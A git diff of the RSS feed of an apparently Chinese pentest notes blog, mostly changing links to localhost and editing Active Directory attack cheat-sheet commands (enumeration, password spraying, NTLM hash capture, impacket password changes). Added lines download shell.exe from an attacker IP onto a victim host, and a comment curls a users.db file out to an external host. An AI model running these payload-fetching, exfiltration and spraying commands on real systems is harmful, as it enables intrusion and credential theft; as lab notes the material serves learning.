@@ -2,16 +2,16 @@
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
     <channel>
         <title>魔法书 on wackymaker</title>
-        <link>https://wackymaker.github.io/categories/%E9%AD%94%E6%B3%95%E4%B9%A6/</link>
+        <link>http://localhost:1313/categories/%E9%AD%94%E6%B3%95%E4%B9%A6/</link>
         <description>Recent content in 魔法书 on wackymaker</description>
         <generator>Hugo -- gohugo.io</generator>
         <language>en-us</language>
-        <lastBuildDate>Sat, 23 Aug 2025 21:42:11 +0800</lastBuildDate><atom:link href="https://wackymaker.github.io/categories/%E9%AD%94%E6%B3%95%E4%B9%A6/index.xml" rel="self" type="application/rss+xml" /><item>
+        <lastBuildDate>Sat, 23 Aug 2025 21:42:11 +0800</lastBuildDate><atom:link href="http://localhost:1313/categories/%E9%AD%94%E6%B3%95%E4%B9%A6/index.xml" rel="self" type="application/rss+xml" /><item>
         <title>剥茧之书</title>
-        <link>https://wackymaker.github.io/post/%E5%89%A5%E8%8C%A7%E4%B9%8B%E4%B9%A6/</link>
+        <link>http://localhost:1313/post/%E5%89%A5%E8%8C%A7%E4%B9%8B%E4%B9%A6/</link>
         <pubDate>Sat, 23 Aug 2025 21:42:11 +0800</pubDate>
         
-        <guid>https://wackymaker.github.io/post/%E5%89%A5%E8%8C%A7%E4%B9%8B%E4%B9%A6/</guid>
+        <guid>http://localhost:1313/post/%E5%89%A5%E8%8C%A7%E4%B9%8B%E4%B9%A6/</guid>
         <description>&lt;h2 id=&#34;事件日志分析&#34;&gt;事件日志分析
 &lt;/h2&gt;&lt;p&gt;Sysmon日志是由Microsoft系统监视器（Sysmon）生成的事件日志，它们提供有关Windows上的系统级操作的详细信息，并记录进程启动、网络连接、文件和注册表修改、驱动程序和服务活动以及WMI操作等活动，通过分析Sysmon日志，安全专家可以检测潜在风险、发现异常并响应安全事件，以增强整体系统监控和安全性。在不断变化的网络安全环境中，提前防范威胁非常重要。&lt;/p&gt;
 &lt;h3 id=&#34;event-id事件id&#34;&gt;Event ID(事件id)
@@ -306,10 +306,10 @@
         </item>
         <item>
         <title>渊蜂之书</title>
-        <link>https://wackymaker.github.io/post/%E6%B8%8A%E8%9C%82%E4%B9%8B%E4%B9%A6/</link>
+        <link>http://localhost:1313/post/%E6%B8%8A%E8%9C%82%E4%B9%8B%E4%B9%A6/</link>
         <pubDate>Sat, 23 Aug 2025 21:25:37 +0800</pubDate>
         
-        <guid>https://wackymaker.github.io/post/%E6%B8%8A%E8%9C%82%E4%B9%8B%E4%B9%A6/</guid>
+        <guid>http://localhost:1313/post/%E6%B8%8A%E8%9C%82%E4%B9%8B%E4%B9%A6/</guid>
         <description>&lt;h2 id=&#34;钓鱼相关&#34;&gt;钓鱼相关
 &lt;/h2&gt;&lt;h3 id=&#34;hta加载js源码&#34;&gt;.hta加载js源码
 &lt;/h3&gt;&lt;p&gt;（逐渐抛弃，特定情况再使用，容易被浏览器沙箱gank）&lt;/p&gt;
@@ -624,10 +624,10 @@
         </item>
         <item>
         <title>血缇之书</title>
-        <link>https://wackymaker.github.io/post/%E8%A1%80%E7%BC%87%E4%B9%8B%E4%B9%A6/</link>
+        <link>http://localhost:1313/post/%E8%A1%80%E7%BC%87%E4%B9%8B%E4%B9%A6/</link>
         <pubDate>Sat, 23 Aug 2025 19:40:56 +0800</pubDate>
         
-        <guid>https://wackymaker.github.io/post/%E8%A1%80%E7%BC%87%E4%B9%8B%E4%B9%A6/</guid>
+        <guid>http://localhost:1313/post/%E8%A1%80%E7%BC%87%E4%B9%8B%E4%B9%A6/</guid>
         <description>&lt;h1 id=&#34;信息收集-枚举&#34;&gt;信息收集-枚举
 &lt;/h1&gt;&lt;h2 id=&#34;前枚举&#34;&gt;前枚举
 &lt;/h2&gt;&lt;h3 id=&#34;域名解析&#34;&gt;域名解析
@@ -754,7 +754,7 @@
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;nxc ldap &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;$ip&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt; -u &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;$user&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt; -H &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;$hash&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt; --bloodhound --collection All --dns-server &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;$ip&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;rusthound&#34;&gt;rusthound
 &lt;/h4&gt;&lt;p&gt;密码&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;rusthound -d $domain -u $user@$domain -p $pass -f $FPDN -i $ip --fqdn-resolver --adcs -z -o ./
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;rusthound -d $domain -u $user@$domain -p $pass -f $FQDN -i $ip --fqdn-resolver --adcs -z -o ./
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;kerbores认证&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;export KRB5CCNAME&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/tmp/jeor.mormont.ccache&amp;#34;&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;rusthound -d $domain -u $user@$domain -p $pass -f $FQDN -k -i $ip --fqdn-resolver --adcs -z -o ./ 
@@ -837,7 +837,7 @@
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;查spn需要管理权限&#34;&gt;查spn（需要管理权限）
 &lt;/h3&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Get-ADUser -Filter {ServicePrincipalName &lt;span style=&#34;color:#f92672&#34;&gt;-like&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;*&amp;#34;&lt;/span&gt;} -Properties ServicePrincipalName |
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Select-Object SamAccountName, ServicePrincipalName
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;acl及用户属性详细枚举&#34;&gt;acl及用户属性详细枚举
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;acl或者用户属性详细枚举&#34;&gt;acl或者用户属性详细枚举
 &lt;/h3&gt;&lt;h4 id=&#34;目标可写枚举&#34;&gt;目标可写枚举
 &lt;/h4&gt;&lt;p&gt;bloodyad远程&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;bloodyAD --host $FQDN --dc-ip $ip -d $domain -u $user -p $pass get writable --detail
@@ -919,12 +919,12 @@ powerview&lt;/p&gt;
 &lt;/h3&gt;&lt;p&gt;加上这个参数，否则第一个匹配成功就会结束&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;--continue-on-success
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;例如
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;nxc smb $ip -u users -p $pass1 --continue-on-success
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;nxc smb $ip -u users -p $pass1 --no-bruteforce
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;加上这个参数，会利用密码和用户名交叉喷洒尝试所有可能&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;--no-bruteforce
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;--continue-on-success
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;winrm密码喷洒
 nxc&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;nxc winrm 192.168.1.0/24 -u userfile -p passwordfile --no-bruteforce
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;nxc winrm 192.168.1.0/24 -u userfile -p passwordfile --continue-on-success
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;dc存活用户枚举&#34;&gt;dc存活用户枚举
 &lt;/h3&gt;&lt;h4 id=&#34;kerbrute爆破&#34;&gt;kerbrute爆破
 &lt;/h4&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;kerbrute userenum --dc $ip -d $domain /opt/user.txt
@@ -1473,7 +1473,11 @@ nxc&lt;/p&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;并且如果这个时候我们需要反弹shell，msf会默认目标处于内网无法回弹，但是如果我们知道目标能访问到我们，我们可以直接使用下面的参数规避报错&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;set ReverseAllowProxy true
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;提权or横向&#34;&gt;提权or横向
-&lt;/h1&gt;&lt;h2 id=&#34;ntlm_thefthash回调窃取_hash钓鱼&#34;&gt;ntlm_theft——hash回调窃取_hash钓鱼
+&lt;/h1&gt;&lt;h2 id=&#34;密码过期用户更改密码&#34;&gt;密码过期用户更改密码
+&lt;/h2&gt;&lt;p&gt;可以直接利用changepass.py更改，他调用的是rpcsmc接口允许跳过认证&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;impacket-changepasswd $domain/$user:&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;@$ip -newpass wackMaker1!
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;提示需要正确密码，如果我们有过期前的密码就填，没有就留空，一样的&lt;/p&gt;
+&lt;h2 id=&#34;ntlm_thefthash回调窃取_hash钓鱼&#34;&gt;ntlm_theft——hash回调窃取_hash钓鱼
 &lt;/h2&gt;&lt;p&gt;当我们处于内网当中的时候，可以利用此工具生成各种文件用来触发smb认证回调来利用responder截获ntlmv2认证，往往需要配合流量转发使用&lt;/p&gt;
 &lt;p&gt;工具地址，注意template也需要下载，最好全部打包&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;https://github.com/Greenwolf/ntlm_theft
@@ -1512,6 +1516,8 @@ nxc&lt;/p&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;mssql语法&#34;&gt;mssql语法
 &lt;/h3&gt;&lt;h4 id=&#34;impacket包连接mssql数据库&#34;&gt;impacket包连接mssql数据库
 &lt;/h4&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;impacket-mssqlclient $user:$pass@$ip
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;直接无法认证可以尝试windows认证
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;impacket-mssqlclient -windows-auth $user:$pass@$ip
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;如果确认凭据完整但是无法登陆，可以换username为sa尝试以管理员登陆&lt;/p&gt;
 &lt;h4 id=&#34;落地常用枚举&#34;&gt;落地常用枚举
 &lt;/h4&gt;&lt;p&gt;查询数据库版本&lt;/p&gt;
@@ -3342,9 +3348,9 @@ linux换行&lt;/p&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;certutil -urlcache -split &lt;span style=&#34;color:#f92672&#34;&gt;-f&lt;/span&gt; http&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;:&lt;/span&gt;//你的IP/文件路径 保存路径
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;certutil -urlcache -split &lt;span style=&#34;color:#f92672&#34;&gt;-f&lt;/span&gt; http&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;:&lt;/span&gt;//&lt;span style=&#34;color:#ae81ff&#34;&gt;10.10&lt;/span&gt;.16.&lt;span style=&#34;color:#ae81ff&#34;&gt;22&lt;/span&gt;/LansweeperDecrypt.ps1 C:\windows\tasks\LansweeperDecrypt.ps1
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;powershell
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Invoke-WebRequest -Uri http&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;:&lt;/span&gt;//&lt;span style=&#34;color:#ae81ff&#34;&gt;10.10&lt;/span&gt;.16.&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;/hr.exe -OutFile &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;C:\users\alexander.green\Desktop\hr.exe&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Invoke-WebRequest -Uri http&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;:&lt;/span&gt;//&lt;span style=&#34;color:#ae81ff&#34;&gt;10.10&lt;/span&gt;.16.&lt;span style=&#34;color:#ae81ff&#34;&gt;23&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;4444&lt;/span&gt;/shell.exe -OutFile &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;C:\users\sqlsvc\Documents&amp;#34;&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;或者
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;(New-Object System.Net.WebClient).DownloadFile(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;http://10.10.16.221/SharpHound.exe&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;C:\temp\SharpHound.exe&amp;#39;&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;(New-Object System.Net.WebClient).DownloadFile(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;http://10.10.16.23:4444/shell.exe&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;C:\users\sqlsvc\Documents\shell.exe&amp;#39;&lt;/span&gt;)
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;通用反向上传脚本uploadspy&#34;&gt;通用反向上传脚本（uploads.py）
 &lt;/h3&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#!/usr/bin/env python3&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#curl -F &amp;#34;file=@/home/app/app/instance/users.db&amp;#34; http://10.10.16.6/&lt;/span&gt;
